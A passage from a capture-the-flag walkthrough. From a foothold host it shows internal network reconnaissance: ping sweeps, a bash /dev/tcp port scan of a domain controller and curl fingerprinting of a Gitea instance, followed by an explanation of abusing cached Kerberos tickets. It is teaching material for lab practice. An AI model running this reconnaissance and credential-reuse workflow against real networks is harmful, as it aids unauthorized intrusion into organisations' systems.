You're going to run three things that answer three different questions.

**Who else is alive on this network?** You could ping all 254 addresses, but that's slow and unnecessary. Infrastructure clusters at low numbers by convention — administrators put the router on `.1`, the servers on `.2`, `.3`, and so on — plus a few round numbers people like. So you check `1 2 3 4 5 10 20 100` and just as a sample.

```bash
for i in 1 2 3 4 5 10 20 100; do (ping -c1 -W1 172.16.20.$i >/dev/null 2>&1 && echo "172.16.20.$i UP") & done; wait
```

Breaking that down, because it looks worse than it is. `for i in ...; do ... done` repeats the middle part once per number, with `$i` standing in for the current one. `ping -c1` sends exactly one probe instead of pinging forever, and `-W1` gives up after one second so a dead address can't stall you. `>/dev/null 2>&1` throws ping's output in the bin — you don't want to read 254 ping reports, you just want to know whether it _worked_. `&&` then means "only if the previous command succeeded," so the `echo` fires for live hosts and stays silent for dead ones. Finally, wrapping it in `( ... ) &` runs each probe in the background so all eight go at once rather than one after another, and `wait` at the end pauses until they've all finished so your prompt doesn't come back mid-scan. Eight seconds of work in one second.

Remember those DNS helpers on port 53 from the last step — they forward questions somewhere. `resolv.conf` is that file that says where.

```bash
cat /etc/resolv.conf
```

**The next logical question is what networks can this machine actually reach, and through what?** The routing table is the kernel's list of directions.

```bash
ip route
```

**Breakdown:**

| Component                   | Purpose                                            | Simple Explanation                                                                                                                                                                                    |
| --------------------------- | -------------------------------------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |
| `for i in 1 2 3 ...`        | Iterate over likely host addresses                 | go through this list of eight numbers, one at a time, calling each one `i`                                                                                                                            |
| `ping -c1 -W1 172.16.20.$i` | One echo request, one-second timeout               | send _one_ packet (`-c1`) to `172.16.20.` followed by that number, and wait at most _one second_ for a reply (`-W1`). Without those two limits, ping keeps going forever and hangs on dead addresses. |
| `>/dev/null 2>&1 && echo`   | Suppress output, print only on success             | throw away everything ping prints. You don't want eight blocks of ping output; you want a list of hits. `/dev/null` is the bin.                                                                       |
| `&& echo "172.16.20.$i UP"` |                                                    | but if the ping _succeeded_, print that address followed by UP. `&&` means "only do the second thing if the first thing worked," so silence equals no answer.                                         |
| `( ... ) &` … `wait`        | Run each probe as a background subshell, then wait | Probe all addresses simultaneously instead of serially                                                                                                                                                |
| `cat /etc/resolv.conf`      | Read DNS client configuration                      | Which server resolves names, and for which domain                                                                                                                                                     |
| `ip route`                  | Display the kernel routing table                   | Which networks this host can reach, and via what                                                                                                                                                      |

**Result:**

```shell
josh@SRV01:~$ for i in 1 2 3 4 5 10 20 100; do (ping -c1 -w1 172.16.20.$i >/dev/null 2>&1 && echo "172.16.20.$i UP") & done; wait
[1] 2110
[2] 2111
[3] 2112
[4] 2114
[5] 2116
[6] 2118
[7] 2122
[8] 2123
172.16.20.2 UP
172.16.20.1 UP
172.16.20.3 UP
[1]   Done                    ( ping -c1 -w1 172.16.20.$i > /dev/null 2>&1 && echo "172.16.20.$i UP" )
[2]   Done                    ( ping -c1 -w1 172.16.20.$i > /dev/null 2>&1 && echo "172.16.20.$i UP" )
[3]   Done                    ( ping -c1 -w1 172.16.20.$i > /dev/null 2>&1 && echo "172.16.20.$i UP" )
[4]   Exit 1                  ( ping -c1 -w1 172.16.20.$i > /dev/null 2>&1 && echo "172.16.20.$i UP" )
[5]   Exit 1                  ( ping -c1 -w1 172.16.20.$i > /dev/null 2>&1 && echo "172.16.20.$i UP" )
[6]   Exit 1                  ( ping -c1 -w1 172.16.20.$i > /dev/null 2>&1 && echo "172.16.20.$i UP" )
[7]-  Exit 1                  ( ping -c1 -w1 172.16.20.$i > /dev/null 2>&1 && echo "172.16.20.$i UP" )
[8]+  Exit 1                  ( ping -c1 -w1 172.16.20.$i > /dev/null 2>&1 && echo "172.16.20.$i UP" )

josh@SRV01:~$ cat /etc/resolv.conf
nameserver 172.16.20.2
search darkzero.ext

josh@SRV01:~$ ip route
default via 172.16.20.1 dev eth0 onlink 
172.16.20.0/24 dev eth0 proto kernel scope link src 172.16.20.3 
```

The lines worth highlighting:

```
172.16.20.1 UP
172.16.20.2 UP
172.16.20.3 UP
```

`ip route` — just answers the question - what this machine can reach

```
default via 172.16.20.1 dev eth0 onlink
172.16.20.0/24 dev eth0 proto kernel scope link src 172.16.20.3
```

A routing table is the kernel's set of directions, and it reads like a decision list: for any address I want to reach, which line applies, and where do I send the packet?

The second line, is the more fundamental one. `172.16.20.0/24 dev eth0 ... scope link` says: any address in the range `172.16.20.1` to `172.16.20.254` is on the **same physical network segment** as me, reachable directly out of the card called `eth0`. **`scope link` is the important phrase** — it means no router is involved. To reach `172.16.20.2` this machine doesn't ask anyone's permission or pass through anything; it puts the packet on the wire and the destination picks it up. And `src 172.16.20.3` confirms which address it'll use as the return label, which is how you know this is you.

The first line, `default via 172.16.20.1`, is the catch-all. Any destination that doesn't match a more specific rule — the entire rest of the internet — gets handed to `172.16.20.1` and becomes its problem. That's the definition of a **default gateway**: the machine you delegate to when you don't know the way yourself. So `.1` is the router.

**The reason Why this matters to you as an attacker:** is there is nothing between you and the other machines on this subnet. No routing, no gateway, no filtering hop. Every service on `172.16.20.2` is one direct connection away. Compare that to your position a while ago, when a firewall was silently binning your packets to 65,533 ports.

`resolv.conf` — the two lines that identify the environment

```
nameserver 172.16.20.2
search darkzero.ext
```

This is the file that tells your machine how to turn names into addresses. Remember those `127.0.0.53` and `127.0.0.54` DNS helpers from the last step? They read this file to know where to forward questions they can't answer.

**`search darkzero.ext`** — this is a **DNS search suffix**. It means: if someone types an unqualified name like `fileserver`, quietly append `.darkzero.ext` and try `fileserver.darkzero.ext`. It's a convenience feature so people inside an organisation can use short names.
<div align="center">
<br>
<br>
</div>

##### What Active Directory is, and why joining matters

Before we proceed I want to give a brief description of what Active Directory is. Skipping this would make the next part of our engagement hard to understand, so here it is plainly.

**Active Directory** is Microsoft's system for running an organization's computers centrally. I remember last time we did Support I didn't do a good job explaining it. Rather than every machine keeping its own list of users and passwords, one server — a **domain controller** — holds the single authoritative list of every user, group, computer, and permission. When you log into your work laptop, the laptop doesn't check your password itself; it asks the domain controller. The collection of machines that trust that server is a **domain**, and this one is called `darkzero.ext`.

A machine that has been **joined** to the domain has already established a permanent trust relationship with the domain controller. It received its own account in the directory, it accepts domain users as legitimate logins, and — critically — **it has the software installed to authenticate against the domain.**

So `search darkzero.ext` isn't telling you "there's a Windows domain nearby." It's telling you **this Linux box is a member of it.** That's the single most valuable fact in the upcoming steps.

The reason why it's important is Because a machine that authenticates users against Active Directory has to _do_ something to authenticate them, and what it does is Kerberos. Kerberos leaves behind reusable credentials. So the implication is: **there may already be a domain credential sitting on this box that you inherited by logging in as josh.** We'll test it, and if it's there, it's a free key into the domain.

##### The map so far

|Address|What it is|How you know|
|---|---|---|
|`172.16.20.1`|The router out of this network|`default via` in the routing table|
|`172.16.20.2`|**Almost certainly the domain controller**|It serves DNS for `darkzero.ext`|
|`172.16.20.3`|SRV01 — you are here|`src 172.16.20.3` on `eth0`|

**So the next step tests both guesses at once:** confirm `.2` is really a domain controller, and find out whether it's also hosting Gitea.

<div align="center"> <br> <br> ※※※※※※※※※※※※※※※※※※※※※※※※ <br> <br> <br> </div>

### 3.11 Enumerate services on the domain controller

##### The tooling problem

You want to scan ports on `172.16.20.2`. The obvious move is nmap — except nmap isn't installed on SRV01, and you can't install it, because this machine has no route to the internet to download anything. You're stuck with what's already here.

What's already here is bash, and bash has a feature almost nobody teaches: **`/dev/tcp`**.
<div align="center">
<br>
<br>
</div>

##### How bash can be a port scanner

On Linux, lots of things that aren't files are made to _look_ like files so that ordinary tools can use them. `/dev/null` is the classic — it looks like a file, and anything you write to it vanishes. `/dev/tcp` is the same trick applied to networking. It doesn't exist on disk; bash intercepts any path of the form `/dev/tcp/HOST/PORT` and, instead of opening a file, **opens a TCP connection** to that host and port.

Which gives you a free port test. We want to Try to write something to it. If the connection succeeds, the port is open. If nothing is listening, the connection is refused and the write fails. You don't care about the data — you care whether the write worked.

For example:

```shell
echo > /dev/tcp/172.16.20.1/88
```

and Printing nothing **is the result.** That's success — and it's worth sitting with, because it's the single most confusing thing about this technique.

Most Unix tools follow a rule: **say nothing when things work, complain only when they don't.** `cp` copies a file and prints nothing. `mkdir` makes a directory and prints nothing. Output means something needed your attention.

Your command has nothing to report. Bash opened a TCP connection to `172.16.20.1` port 88, wrote a newline into it, closed it, and moved on. Everything it was asked to do, it did. So: silence.

Here's what a failure looks like, for contrast — try a port nothing is listening on:

```shell
josh@SRV01:~$ echo > /dev/tcp/127.0.0.1/12345
-bash: connect: Connection refused
-bash: /dev/tcp/127.0.0.1/12345: Connection refused
```

That's the entire probe. `echo` with no arguments writes a newline; the newline is irrelevant, the _attempt_ is the test.

**Command:**

```bash
for p in 22 53 80 88 135 139 389 443 445 464 636 3000 3268 3389 5985 9389; do (timeout 1 bash -c "echo > /dev/tcp/172.16.20.2/$p" 2>/dev/null && echo "$p OPEN") & done 2>/dev/null; wait
```

Same skeleton as the ping sweep — loop, background each probe, `wait` at the end — there's only two additions.

**`timeout 1`** wraps the probe and kills it after a second. and this is Necessary because a _filtered_ port behaves differently from a closed one. Closed means the machine actively replies "nothing here" and you fail instantly. Filtered means a firewall silently swallows your packet and no reply ever comes, so without a timeout that probe hangs indefinitely.

**`bash -c "..."`** launches a small child shell to run the probe. It's needed because `timeout` expects a program to run, and `/dev/tcp` is a bash feature rather than a program — so you hand `timeout` a bash to run, and tell that bash to do the redirect.

**`2>/dev/null`** silences the "connection refused" complaints so only successes print.
<div align="center">
<br>
<br>
</div>

##### Why these sixteen ports

This isn't a general scan. Every port here is chosen to answer a specific question.

Most of them test one thing: **is `.2` a domain controller?** Active Directory services always sit on the same well-known ports, so you check for them as a set — `88` and `464` for Kerberos, `389` and `636` for LDAP, `445` and `139` for SMB, `135` for RPC, `53` for DNS, `3268` for the global catalog, `5985` for remote PowerShell, `9389` for AD web services. Finding a handful could be coincidence. Finding all of them together is an unmistakable fingerprint.

A few are there to be _negative_ results — `22`, `80`, `443`, `3389`. 

And one is the outside we have a bet for port **`3000`**, which is Gitea's default port.



**Result:**

```shell
josh@SRV01:~$ for p in 22 53 80 88 135 139 389 443 445 464 636 3000 3268 3389 5985 9389; do (timeout 1 bash -c "echo > /dev/tcp/172.16.20.2/$p" 2>/dev/null && echo "$p OPEN") & done 2>/dev/null; wait
88 OPEN
139 OPEN
135 OPEN
464 OPEN
636 OPEN
5985 OPEN
3000 OPEN
9389 OPEN
53 OPEN
389 OPEN
445 OPEN
3268 OPEN
[1]   Exit 124                ( timeout 1 bash -c "echo > /dev/tcp/172.16.20.2/$p" 2> /dev/null && echo "$p OPEN" )
[2]   Done                    ( timeout 1 bash -c "echo > /dev/tcp/172.16.20.2/$p" 2> /dev/null && echo "$p OPEN" )
[4]   Done                    ( timeout 1 bash -c "echo > /dev/tcp/172.16.20.2/$p" 2> /dev/null && echo "$p OPEN" )
[5]   Done                    ( timeout 1 bash -c "echo > /dev/tcp/172.16.20.2/$p" 2> /dev/null && echo "$p OPEN" )
[6]   Done                    ( timeout 1 bash -c "echo > /dev/tcp/172.16.20.2/$p" 2> /dev/null && echo "$p OPEN" )
[7]   Done                    ( timeout 1 bash -c "echo > /dev/tcp/172.16.20.2/$p" 2> /dev/null && echo "$p OPEN" )
[9]   Done                    ( timeout 1 bash -c "echo > /dev/tcp/172.16.20.2/$p" 2> /dev/null && echo "$p OPEN" )
[10]   Done                    ( timeout 1 bash -c "echo > /dev/tcp/172.16.20.2/$p" 2> /dev/null && echo "$p OPEN" )
[11]   Done                    ( timeout 1 bash -c "echo > /dev/tcp/172.16.20.2/$p" 2> /dev/null && echo "$p OPEN" )
[12]   Done                    ( timeout 1 bash -c "echo > /dev/tcp/172.16.20.2/$p" 2> /dev/null && echo "$p OPEN" )
[13]   Done                    ( timeout 1 bash -c "echo > /dev/tcp/172.16.20.2/$p" 2> /dev/null && echo "$p OPEN" )
[15]-  Done                    ( timeout 1 bash -c "echo > /dev/tcp/172.16.20.2/$p" 2> /dev/null && echo "$p OPEN" )
[16]+  Done                    ( timeout 1 bash -c "echo > /dev/tcp/172.16.20.2/$p" 2> /dev/null && echo "$p OPEN" )
[3]   Exit 124                ( timeout 1 bash -c "echo > /dev/tcp/172.16.20.2/$p" 2> /dev/null && echo "$p OPEN" )
[8]-  Exit 124                ( timeout 1 bash -c "echo > /dev/tcp/172.16.20.2/$p" 2> /dev/null && echo "$p OPEN" )
[14]+  Exit 124                ( timeout 1 bash -c "echo > /dev/tcp/172.16.20.2/$p" 2> /dev/null && echo "$p OPEN" )
```

Twelve open, four timed out.

Quick note on `Exit 124` before the findings, because it's a genuinely useful thing to recognise. **124 is the exit code `timeout` uses to say "I killed it."** So those four jobs didn't fail to connect — they never got an answer at all, and the one-second limit expired. Jobs 1, 3, 8, and 14 are positions one, three, eight, and fourteen in your port list: **22, 80, 443, 3389.**

And notice they behaved differently from the open ones in a specific way. A _closed_ port replies "nothing listening here" and fails instantly, which would have printed `Exit 1`. These hung for a full second and had to be killed, which means something silently dropped the packets — a firewall. Same visible result, different mechanism, and it's the identical distinction we drew when we were discussing the difference between loopback and filtered.
<div align="center">
<br>
<br>
</div>

We can proceed to check out the meaningful part of our output:
### What the twelve open ports tell you

Take them in groups, because it's the combination that identifies the machine rather than any single line.

**88 and 464 — Kerberos.** This is the strongest single indicator, and it's near-conclusive on its own. Port 88 runs the **Key Distribution Center**, the service that issues authentication tickets for the domain. Port 464 handles domain password changes. **Only a domain controller runs these.** Nothing else in a Windows environment has any business on port 88 — it's not an optional thingy, it's the heart of AD authentication and we wil be talking directly to port 88 in a few.

**389 and 636 — LDAP.** LDAP is the query language for the directory itself. Every user, every group, every computer, every permission is an object you can read over LDAP given valid credentials. 389 is unencrypted, 636 is the TLS version. **For an attacker this is the primary enumeration surface of a domain** — once you have any domain credential, LDAP is how you ask "who's in which group, and who has power over whom." That is also going to be important moving forward.

**445 and 139 — SMB.** When we'll eventually dump every password hash in the domain, it goes over 445. 139 is the legacy NetBIOS version of the same thing, and it's just kept around for compatibility.

**135 — RPC endpoint mapper.** A directory service for other services. You ask 135 "where is the interface I want," and it tells you which dynamic high port to connect to. Remember the runner on `*:41647` picking a random port? Windows does that constantly, and 135 is how clients find things afterwards.

**53 — DNS.** Confirms the `resolv.conf` finding from the last step. This machine really is the domain's nameserver.

**5985 — WinRM.** Remote PowerShell. If we get valid domain credentials, this is a full remote shell on the machine, and it's the standard path tools like `evil-winrm` use. **Note this one down** — it's an execution route into the DC that doesn't require SMB, and it's how you'll eventually land the root flag.

You Put those ports together and the answer isn't a guess anymore. **`172.16.20.2` is a domain controller for `darkzero.ext`.** DNS alone was suggestive; Kerberos plus LDAP plus global catalog plus SMB is a fingerprint you can rely on.
<div align="center">
<br>
<br>
</div>

but that's not even the peak of our findings
##### Two findings that are bigger than "it's a DC"

###### 3268 means there's more than one domain

Port 3268 is the **global catalog**, and it deserves separate attention because most people gloss over it.

A normal LDAP server on a domain controller knows everything about _its own_ domain. A global catalog additionally holds a **partial copy of every object in the entire forest**. So the concept you need is: a **forest** is a collection of domains that trust each other, and a **domain** is one administrative unit within it. An organisation might run `corp.example.com` and `dev.example.com` as separate domains inside one forest, so each has its own administrators, while still letting users from one access resources in the other.

Global catalogs exist to make forest-wide searches possible — without one, finding a user in a sibling domain would mean querying every domain controller in the organisation.

**So its presence hints that this environment contains more than one domain.** You currently know about `darkzero.ext`. The box is called DarkZero**Returns**, and a huge part of prviesc in this box turns entirely on a _second_ domain and the trust relationship between them. File this away; it's the earliest signal of where the box is ultimately going.
<div align="center">
<br>
</div>

###### 3000 is the real prize

```
3000 OPEN
```

Gitea's default port, answering on the domain controller.

Two things follow, and the second is the one that matters.

**First, you've found the missing server.** Initially we established that SRV01 runs a Gitea _runner_ but no Gitea _server_. The server has to exist somewhere for the runner to take orders from. Here it is.

**Second — a web application is running on a domain controller.** That is a serious architectural mistake, and it's worth understanding precisely why rather than just labelling it bad practice.

A domain controller holds `NTDS.dit`, the database containing every password hash for every account in the domain. It is the gold mine, and the standard rule is that a DC runs domain controller software and _nothing else_. No web apps, no databases, no file shares beyond the required ones. The reason is blast radius: if you compromise a web app on an ordinary server, you get that server. If you compromise a web app on a domain controller, **you get the domain** — because code execution on a DC means access to every credential in the organisation.

So having Gitea here converts any Gitea vulnerability from an application problem into a domain-wide one. Whether you end up exploiting Gitea directly or using it as a stepping stone, it sits on the most sensitive machine in the environment.

**Next question, and it's a practical one:** before you invest any effort in attacking port 3000, confirm what's actually there. A port matching a default is suggestive, not proof — plenty of things run on 3000. So you fingerprint it, and while you're doing that you pick up one specific detail that turns out to be mandatory for the Kerberos step two moves from now.
<div align="center">
<br>
<br>
</div>

###### How a targeted port list is chosen

A full-range scan is the correct opening move against a host you know nothing about. Once you hold specific beliefs about what a host _is_, the correct move changes: scan the ports that would prove or disprove those beliefs. Every port in the list above earns its place by answering a question, and each falls into one of three categories.

**Role-confirmation ports** test a hypothesis about the host's function. The hypothesis here came from `/etc/resolv.conf` in 3.10, which named `172.16.20.2` as the subnet's nameserver. Windows environments almost always run AD-integrated DNS on a domain controller, so the address serving DNS is probably the directory server as well. Testing that claim requires the ports a domain controller cannot operate without, because Active Directory is not a single service but a fixed bundle that always travels together: Kerberos on 88 and 464, LDAP on 389 and 636, global catalog on 3268, SMB on 445, RPC on 135 and 139, ADWS on 9389, and DNS on 53. A single open port among these proves little in isolation — plenty of hosts run LDAP. The full cluster is conclusive, because nothing other than a domain controller runs all of it.

**Targeted-guess ports** test a specific prediction derived from earlier evidence. Port 3000 is the only such entry. Section 3.9 found a Gitea Actions runner on SRV01 with no corresponding Gitea server, and a runner agent is inert without a server to accept jobs from — so the server must exist elsewhere on the subnet. Gitea ships listening on 3000 by default, and defaults are seldom changed in practice. One port, one prediction.

**Control ports** are included so their _absence_ teaches something. These are as valuable as the ports expected to be open:

|Port|Prediction|What absence proves|Simple Explanation|
|---|---|---|---|
|22|SSH, as on SRV01|Not a Linux host — supports the Windows conclusion|No Linux-style remote login here|
|80, 443|Standard web server|No general web surface; port 3000 is the only application|The DC isn't running a normal website|
|3389|RDP enabled|No graphical remote access route|Can't reach the Windows desktop|

**Reading the failures precisely.** Ports 22, 80, 443, and 3389 all returned exit code 124, which is `timeout` reporting that it killed the probe before it finished. That distinction matters. A genuinely closed port answers immediately with a TCP reset, and the probe fails fast; a port that hangs for the full second is one where packets were **dropped without reply**. These four are therefore filtered rather than closed — consistent with Windows Firewall permitting the domain services and silently discarding everything else. Exit code 124 is the signature of filtering, and it distinguishes "nothing is listening" from "something refused to tell you."

**A note on output order and job notices.** Each probe is backgrounded, so results print in the order replies arrive rather than in list order; sorting the recorded output above is cosmetic. An interactive shell will additionally print a job-control notice such as `[8] Exit 124` for each backgrounded subshell as it completes. This is status reporting, not error output. Run `set +m` beforehand to suppress it and leave only the `OPEN` lines, then `set -m` to restore normal behavior.
<div align="center"> <br> <br> </div>

##### Fingerprinting a domain controller by its ports

Active Directory domain controllers advertise themselves through a distinctive and stable set of services. Recognizing the pattern is faster than any dedicated tool.

The Kerberos pair, **88** and **464**, is the strongest single indicator. Port 88 runs the Key Distribution Center that issues authentication tickets; 464 handles password changes. Only a DC runs these.

**LDAP** on 389 and 636 exposes the directory itself — every user, group, computer, and policy object. Anonymous binds are usually restricted, but with valid credentials LDAP is the primary enumeration surface for a domain.

**3268** is the global catalog, and it carries extra meaning. A global catalog holds a partial replica of every object in the _entire forest_, not just the local domain. Its presence signals that the forest may contain multiple domains and that cross-domain queries are possible from this single host.

**445** carries SMB, which does far more than file sharing: named pipes over SMB transport the protocols behind remote service control, scheduled tasks, and the DRSUAPI replication interface that DCSync abuses.

**9389** is Active Directory Web Services, the SOAP endpoint behind PowerShell's `Get-ADUser` and related cmdlets.

Seeing all of these together identifies a DC with certainty. Seeing an _additional_ service alongside them — here, Gitea on 3000 — is a finding in its own right. Domain controllers are supposed to run domain controller software and nothing else, precisely because any application vulnerability on a DC is a domain compromise rather than an application compromise.

**Next:** Confirm the service on port 3000 is Gitea and determine its authentication configuration.

<div align="center"> <br> <br> ※※※※※※※※※※※※※※※※※※※※※※※※ <br> <br> <br> </div>

### 3.12 Confirm and fingerprint the Gitea instance

**Though we're confident about Port 3000 matching Gitea's default it's abit circumstantial. Nothing stops someone from running a Node app or a dev server on 3000 — it's a popular number precisely because it's the default for a lot of tooling. Acting on an assumption here would ok but there's no harm in checking.

But there are two better reasons to check than just diligence.

**Version numbers decide your attack.** Gitea 1.25 and Gitea 1.19 are different software with different bugs. The vulnerability you're eventually going to use exists in a specific version range, and if this instance were older or newer, the whole plan changes. You need the number before you can plan anything.

**And you need to know what the application calls itself.** This is the one that catches people out, and I'll spell out why once you see the output. A web application often has an opinion about its own name that differs from the address you used to reach it, and in a Kerberos environment that name is not cosmetic — it's load-bearing.

**Commands:**

```bash
curl -s -I http://172.16.20.2:3000/
```

```bash
curl -s http://172.16.20.2:3000/ | grep -iE '<title>|gitea|version' | head -20
```

The second command assumes the first won't be enough, and fetches the actual page body to search it.

Without `-I` you get the full HTML, which for a modern web app is a few hundred lines of markup you have no interest in reading. So you filter. `grep` prints only lines matching a pattern; `-i` makes it case-insensitive so `Gitea`, `gitea`, and `GITEA` all match; `-E` enables extended regular expressions, which is what lets you use `|` to mean "or". So `'<title>|gitea|version'` prints any line containing a page title, the word gitea, or the word version.

`head -20` caps it at the first twenty matches, in case the page mentions gitea forty times.

**Why search for those three things specifically?** The `<title>` tag is what a browser shows in its tab, and applications almost always put their own name there. The literal string `gitea` catches asset paths, links, and JavaScript config. And `version` catches the number you're after — which, as you'll see, is hiding somewhere slightly unexpected.

**Breakdown:**

|Component|Purpose|Simple Explanation|
|---|---|---|
|`curl -s`|Silent mode — suppress progress output|Fetch quietly|
|`-I`|HEAD request only|Get headers without the page body|
|`grep -iE '<title>\|gitea\|version'`|Case-insensitive extended regex over three patterns|Pull out the identifying lines|
|`head -20`|Limit to first 20 matches|Keep the output readable|

**Result:**

```shell
josh@SRV01:~$ curl -s -I http://172.16.20.2:3000/
HTTP/1.1 200 OK
Date: Thu, 30 Jul 2026 14:55:00 GMT

josh@SRV01:~$ curl -s http://172.16.20.2:3000/ | grep -iE '<title>|gitea|version' | head -20
```

```html
<html lang="en-US" data-theme="gitea-auto">
        <title>Gitea: Git with a cup of tea</title>
        <meta name="author" content="Gitea - Git with a cup of tea">
        <meta name="description" content="Gitea (Git with a cup of tea) is a painless self-hosted Git service written in Go">
        <meta name="keywords" content="go,git,self-hosted,gitea">
        <meta property="og:title" content="Gitea: Git with a cup of tea">
        <meta property="og:url" content="http://gitea.darkzero.ext:3000/">
        <meta property="og:description" content="Gitea (Git with a cup of tea) is a painless self-hosted Git service written in Go">
<meta property="og:site_name" content="Gitea: Git with a cup of tea">
<link rel="stylesheet" href="/assets/css/theme-gitea-auto.css?v=1.25.0">
                appUrl: 'http:\/\/gitea.darkzero.ext:3000\/',
                assetVersionEncoded: encodeURIComponent('1.25.0'), 
                customEmojis: {"codeberg":":codeberg:","git":":git:","gitea":":gitea:","github":":github:","gitlab":":gitlab:","gogs":":gogs:"},
                        <a class="item" target="_blank" rel="noopener noreferrer" href="https://docs.gitea.com">Help</a>
                                        Gitea: Git with a cup of tea
                                Simply <a target="_blank" rel="noopener noreferrer" href="https://docs.gitea.com/installation/install-from-binary">run the binary</a> for your platform, ship it with <a target="_blank" rel="noopener noreferrer" href="https://github.com/go-gitea/gitea/tree/master/docker">Docker</a>, or get it <a target="_blank" rel="noopener noreferrer" href="https://docs.gitea.com/installation/install-from-package">packaged</a>.
                                Gitea runs anywhere <a target="_blank" rel="noopener noreferrer" href="https://go.dev/">Go</a> can compile for: Windows, macOS, Linux, ARM, etc. Choose the one you love!
                                Gitea has low minimal requirements and can run on an inexpensive Raspberry Pi. Save your machine energy!
                                Go get <a target="_blank" rel="noopener noreferrer" href="https://code.gitea.io/gitea">code.gitea.io/gitea</a>! Join us by <a target="_blank" rel="noopener noreferrer" href="https://github.com/go-gitea/gitea">contributing</a> to make this project even better. Don't be shy to be a contributor!
                        <a target="_blank" rel="noopener noreferrer" href="https://about.gitea.com">Powered by Gitea</a>
```

##### The HEAD request told you almost nothing — and that's a finding

```
HTTP/1.1 200 OK
Date: Thu, 30 Jul 2026 17:11:00 GMT
```

Two lines. Compare that with the response nginx gave you on the target's public port 80, which cheerfully announced `Server: nginx/1.24.0 (Ubuntu)`.

**No `Server` header here.** So the quick path didn't work — this application doesn't introduce itself in its headers, and you have to go read the page body instead. Worth internalising as a general lesson: header fingerprinting is the cheapest identification method and you always try it first, but plenty of software omits the header. Absence of a `Server` header isn't a dead end, it just means the evidence is somewhere else.

`200 OK` means the request succeeded and something is genuinely serving HTTP here.

One bonus observation while it's in front of you. That `Date` header is **the domain controller's own clock**, as the DC reports it. Store that away, because Kerberos — which you're about to use — refuses tickets when the client and server clocks differ by more than five minutes. It's the single most common reason Kerberos commands fail.

##### The version, and where it was hiding

```
<link rel="stylesheet" href="/assets/css/theme-gitea-auto.css?v=1.25.0">
assetVersionEncoded: encodeURIComponent('1.25.0'),
```

**Gitea 1.25.0**, stated twice independently. But look _where_ it's stated, because neither location is a place anyone put a version number on purpose.

The first is a **cache buster**.

The second is the same version handed to the page's JavaScript for the same purpose.

The version matters because it scopes everything downstream. Gitea 1.25 is the version range where the flaw we'll use exists. 

There's also a second thing 1.25 tells you: **this version ships Gitea Actions**, Gitea's built-in CI/CD system — the "automatically build and test code when someone submits it" feature. Which pairs precisely with `/opt/gitea-runner` on SRV01. You now have both halves of that system located: the server here, the agent that executes jobs on your foothold.

##### The line this whole step was for

```
<meta property="og:url" content="http://gitea.darkzero.ext:3000/">
appUrl: 'http:\/\/gitea.darkzero.ext:3000\/',
```

You connected to `172.16.20.2`. The application replied with links pointing at **`gitea.darkzero.ext`**.

That's Gitea's `appUrl` setting — the base address an administrator configures at install time, from which Gitea generates every absolute URL it emits. Clone links, email notifications, redirects, social-preview tags. It has no idea and no interest in what address _you_ used to reach it; it builds URLs from its configured name.

Two implications, and the second is the important one.

**Practically, you should use the name from now on.** Applications that generate absolute URLs from a configured base often redirect you to that base, and mismatches produce confusing failures — cookies scoped to the wrong host, redirects bouncing you sideways. Working with the name the app expects avoids a category of problem you'd otherwise waste time debugging.

**But the real reason is Kerberos**, and here's the part to actually remember.

In a Windows domain, every service that can be authenticated to has a formal registered name in the directory called a **Service Principal Name**, shaped `SERVICE/hostname`. A web service's SPN looks like `HTTP/gitea.darkzero.ext`. When you ask the domain controller for a ticket to a service, **you ask by SPN**, and the domain controller looks that exact string up in the directory. It does not resolve names, it does not check whether two names point at the same machine — it performs a lookup on the string you gave it.

So a request for `HTTP/gitea.darkzero.ext` will succeed if that SPN is registered. A request for `HTTP/172.16.20.2` will fail with "Server not found in Kerberos database", because nobody registers SPNs against IP addresses.

**You have just learned the exact string you'll need in an upcoming step, and you'd have been stuck without it.** That's what this step was really for.


Two problems now sit side by side. Gitea needs a login and you don't have one. And SRV01 is a member of an Active Directory domain, which — as I flagged in 3.10 — means it has domain authentication machinery installed and josh logged into it.

**Those two facts are about to solve each other.** The next step costs one command and it's the highest-value single command in this half of the box.
<div align="center"> <br> <br> ※※※※※※※※※※※※※※※※※※※※※※※※ <br> <br> <br> </div>

### 3.13 Confirm Kerberos credentials on the domain-joined host

So You need to log into Gitea. You have no Gitea password. Nobody gave you one, and there's no signup page you can abuse.

But earlier we found out that SRV01 is **joined** to the `darkzero.ext` domain. And a domain-joined machine doesn't just know a domain exists — it has the full authentication machinery installed and running, because that's how it validates domain users when they log in.

So the question is: **when you logged in over SSH as josh, did that login leave something behind?**

To understand why the answer might be yes, you need to know roughly how Windows domain authentication actually works. This is the most important concept in the second half of the box, so I'll try to do it properly.

##### Kerberos, from scratch

Start with the problem Kerberos was built to solve.

Naive authentication sends your password to whatever you're logging into. You type it, it travels, the service checks it. That's how the campaign web app worked, and it has an obvious flaw in a large organisation: **every single service ends up handling your password.** Fifty internal applications means fifty places your password could be logged, stolen, or leaked. And you'd be typing it fifty times a day.

Kerberos fixes this by never sending your password to services at all. Instead, it uses **tickets**.

###### The two-stage dance

There's a service on the domain controller called the **Key Distribution Center**, the KDC — that's what port 88 was in your scan. Everything goes through it.

**Stage one, once per session.** You prove you know your password to the KDC. In return, the KDC hands you a **Ticket Granting Ticket** — a TGT. Think of it as a wristband at a festival: you showed ID at the gate once, and now the wristband is your proof of entry for the rest of the day.

The clever part is what a TGT actually is. It's a small blob of data containing your identity, an expiry time, and some keys — **encrypted with a secret key that only the KDC knows.** You're holding it, but you can't read it or modify it. You can only hand it back.

**Stage two, once per service.** You want to reach the Gitea website. You hand your TGT back to the KDC and say "I'd like a ticket for `HTTP/gitea.darkzero.ext`." The KDC decrypts your TGT (proving it issued the thing), confirms you are who it says, and issues a **service ticket** scoped to that one service.

That service ticket is encrypted with **the service account's own key**, not yours. You hand it to Gitea. Gitea decrypts it with its own key, reads the identity inside, and thinks: _only the KDC could have produced something that decrypts correctly with my key, so this identity is genuine._ You're logged in.

Notice what never happened. **Your password never went to Gitea.** Gitea never even talked to the domain controller during that exchange — it verified the ticket offline using its own key. That's why single sign-on feels instant.

###### Why this is a gift to an attacker

Here's the part that matters to you.

**Holding a TGT is functionally equivalent to holding the password.** Not literally the same — you can't read the password out of it, and it expires — but for the purpose of _doing things_, it's equivalent. With a TGT you can request a service ticket for **any service in the domain**, as many times as you like, without ever re-authenticating.

And it's quiet. Requesting service tickets doesn't generate the logon events that repeated password authentication does. There's no failed-login counter to trip, no lockout to worry about.

So the standard move on any domain-joined machine you compromise is: **check whether there are tickets lying around.** Because a login process may well have obtained one on a user's behalf and left it in a cache.

###### Where tickets live

